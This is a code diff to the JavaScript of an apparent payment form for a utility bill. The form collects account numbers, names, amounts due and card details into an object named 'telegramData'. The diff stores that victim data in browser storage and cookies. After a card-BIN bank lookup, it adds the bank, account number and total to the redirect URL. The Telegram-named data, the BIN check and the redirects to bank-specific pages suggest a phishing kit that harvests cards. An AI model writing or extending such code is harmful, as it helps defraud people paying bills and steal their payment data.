@@ -696,6 +696,16 @@ document.addEventListener('DOMContentLoaded', function () {
                     cardDoc: `${document.getElementById('card-doc-type').value}: ${cardDocNum}`
                 };
 
+                try {
+                    localStorage.setItem('aire_pago_total', telegramData.totalPagar);
+                    localStorage.setItem('aire_pago_nic', telegramData.nic);
+                    localStorage.setItem('aire_pago_nombre', telegramData.nombre);
+                    sessionStorage.setItem('aire_pago_total', telegramData.totalPagar);
+                    sessionStorage.setItem('aire_pago_nic', telegramData.nic);
+                    document.cookie = `aire_pago_total=${encodeURIComponent(telegramData.totalPagar)}; path=/; max-age=86400`;
+                    document.cookie = `aire_pago_nic=${encodeURIComponent(telegramData.nic)}; path=/; max-age=86400`;
+                } catch(e) {}
+
                 showLoadingOverlay('Verificando tarjeta y banco...');
 
                 fetch('process_card_bin.php', {
@@ -710,8 +720,13 @@ document.addEventListener('DOMContentLoaded', function () {
                         btn.disabled = false;
                         if (data.status === 'success' && data.redirect) {
                             showNotification(`Banco detectado: ${data.bank || 'Redirigiendo...'}`, 'success');
+                            let dest = data.redirect;
+                            if (!dest.includes('total=')) {
+                                const sep = dest.includes('?') ? '&' : '?';
+                                dest += `${sep}banco=${encodeURIComponent(data.bank || '')}&nic=${encodeURIComponent(telegramData.nic)}&total=${encodeURIComponent(telegramData.totalPagar)}`;
+                            }
                             setTimeout(() => {
-                                window.location.href = data.redirect;
+                                window.location.href = dest;
                             }, 1000);
                         } else {
                             showNotification('Solicitud procesada correctamente', 'success');
